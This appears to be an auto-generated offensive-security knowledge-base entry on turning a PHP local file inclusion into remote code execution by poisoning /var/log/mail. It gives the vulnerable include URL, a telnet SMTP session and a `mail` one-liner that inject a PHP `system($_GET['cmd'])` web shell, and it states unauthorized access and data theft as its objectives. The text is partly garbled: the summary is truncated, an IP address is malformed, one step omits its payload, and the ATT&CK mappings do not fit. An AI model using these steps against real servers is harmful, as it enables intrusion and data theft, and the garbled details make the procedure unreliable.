---
id: a93ec17f-db42-48ff-955d-27b77930e5b7
name: LFI to RCE via Mail Log File Inclusion
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.614016+00:00'
updated_at: '2023-04-10T20:22:15.211562+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Data Staged|T1074 - Data Staged]]'
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Password Policy Discovery|T1201 - Password Policy Discovery]]'
tags:
- '[[File Inclusion]]'
- '[[LFI to RCE via controlled log file]]'
- '[[RCE via Mail]]'
commands:
- '[[Accessing Mail Log File]]'
- '[[Send Test Email]]'
- '[[Telnet SMTP server and send email with PHP code injection]]'
---

# LFI to RCE via Mail Log File Inclusion

## Summary

This procedure involves exploiting a Local File Inclusion vulnerability to achieve Remote Code Execution via a controlled log file. The attacker first sends an email using an open SMTP server, then includes the log file located at /var/log/mail via the vulnerable PHP script. The log file contains t

## Description

# Description

This procedure involves exploiting a Local File Inclusion vulnerability to achieve Remote Code Execution via a controlled log file. The attacker first sends an email using an open SMTP server, then includes the log file located at /var/log/mail via the vulnerable PHP script. The log file contains the attacker's PHP code which is executed on the server, resulting in Remote Code Execution. This technique can be used to gain unauthorized access to the target system and potentially steal sensitive data.

## Requirements

1. Access to an open SMTP server

1. Knowledge of the target system's file structure

1. Vulnerable PHP script

## Defense

1. Always sanitize user input to prevent Local File Inclusion vulnerabilities

1. Implement proper access controls to prevent unauthorized access to sensitive files

1. Monitor for suspicious activity such as unexpected emails or file inclusions

## Objectives

1. Achieve Remote Code Execution on the target system

1. Gain unauthorized access to the target system

1. Potentially steal sensitive data

# Instructions

1. Send an email using the open SMTP server, then include the log file in the vulnerable PHP script

**Code**: [[http://example.com/index.php?page=/var/log/mail]]

> The attacker sends an email using an open SMTP server, then includes the log file located at /var/log/mail via the vulnerable PHP script. The log file contains the attacker's PHP code which is executed on the server, resulting in Remote Code Execution.

**Command** ([[Accessing Mail Log File]]):

```bash
http://example.com/index.php?page=/var/log/mail
```

2. Use Telnet to connect to the target system's SMTP server, then send an email with PHP code

**Code**: [[root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.1]]

> The attacker connects to the target system's SMTP server using Telnet, then sends an email with PHP code in the subject line. The PHP code is executed on the server, resulting in Remote Code Execution.

**Command** ([[Telnet SMTP server and send email with PHP code injection]]):

```bash
telnet 10.10.10.10. 25
helo ok
mail from: mail@example.com
rcpt to: root
data
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

3. Send an email with PHP code using the mail command

**Code**: [[mail]]

> The attacker sends an email with PHP code using the mail command. The PHP code is executed on the server, resulting in Remote Code Execution.

**Command** ([[Send Test Email]]):

```bash
mail -s 'Test email' user@example.com
This is a test email.
```

4. Send an email with PHP code to the target system via the mail command

**Code**: [[mail -s "<?php system($_GET['cmd']);?>" www-data@1]]

> The attacker sends an email with PHP code to the target system using the mail command. The PHP code is executed on the server, resulting in Remote Code Execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Discovery|TA0007 - Discovery]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Data Staged|T1074 - Data Staged]]
- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Password Policy Discovery|T1201 - Password Policy Discovery]]

## Commands Used

- [[Accessing Mail Log File]]
- [[Send Test Email]]
- [[Telnet SMTP server and send email with PHP code injection]]

## Tags

- [[File Inclusion]]
- [[LFI to RCE via controlled log file]]
- [[RCE via Mail]]
